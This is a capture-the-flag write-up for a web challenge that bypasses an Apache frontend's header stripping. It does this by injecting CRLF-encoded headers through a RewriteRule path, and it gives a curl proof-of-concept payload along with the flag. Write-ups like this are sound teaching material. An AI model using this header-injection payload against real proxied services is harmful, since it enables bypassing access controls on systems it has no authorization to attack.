# **Wonka CTF Challenge Writeup: Header Injection via Path-Based Request Smuggling**

**Challenge URL**: `https://wonka.chal.cyberjousting.com`  
**Category**: Web Exploitation  
**Difficulty**: Medium    
**Flag**: byuctf{i_never_liked_w1lly_wonka}
---

## **Challenge Overview**
The challenge consists of a two-tier web application:
1. **Frontend**: Apache HTTP server (port `1337`)  
   - Proxies requests to `/name/<input>` to the backend.  
   - Strips all `A/a` headers using `RequestHeader unset`.  
2. **Backend**: Node.js/Express server (port `3000`)  
   - Returns the flag if the request contains the header `a: admin`.  
   - Otherwise, it echoes back a sanitized `name` parameter.

**Objective**: Retrieve the flag by bypassing the frontend's header stripping mechanism.

---

## **Vulnerability Analysis**
The key vulnerabilities are:
1. **Apache RewriteRule Misconfiguration**  
   - The `RewriteRule` forwards raw path input to the backend without sanitizing newlines (`\r\n`).  
   - This allows **HTTP header injection** via the path parameter.  

2. **Header Stripping Bypass**  
   - The `RequestHeader unset A/a` directive only removes headers from the original request, not those injected later.  

3. **Backend Trusts Raw Input**  
   - The Node.js backend processes the smuggled headers as part of the HTTP request.

---

## **Exploitation Steps**
### **Step 1: Crafting the Malicious Request**
To bypass the frontend’s header stripping, we inject a fake HTTP request inside the path parameter:
```
/name/test HTTP/1.1\r\n
Host: wonka.chal.cyberjousting.com\r\n
a: admin\r\n
\r\n
```
- Encoded in a `curl` command:
  ```bash
  curl -i "https://wonka.chal.cyberjousting.com/name/test%20HTTP/1.1%0d%0aHost:%20wonka.chal.cyberjousting.com%0d%0aa:%20admin%0d%0a%0d%0a"
  ```

### **Step 2: Why This Works**
1. The `%20` (space) and `%0d%0a` (CRLF) characters trick Apache into interpreting the path as a new HTTP request.  
2. The backend receives:
   ```
   GET /?name=test HTTP/1.1
   Host: wonka.chal.cyberjousting.com
   a: admin
   ```
3. Since the `a: admin` header is present, the backend returns the flag.

---

## **Proof of Concept (PoC)**
```bash
curl -i "https://wonka.chal.cyberjousting.com/name/test%20HTTP/1.1%0d%0aHost:%20wonka.chal.cyberjousting.com%0d%0aa:%20admin%0d%0a%0d%0a"
```
**Expected Output**:
```http
HTTP/2 200 OK
...
byuctf{i_never_liked_w1lly_wonka}
```

---
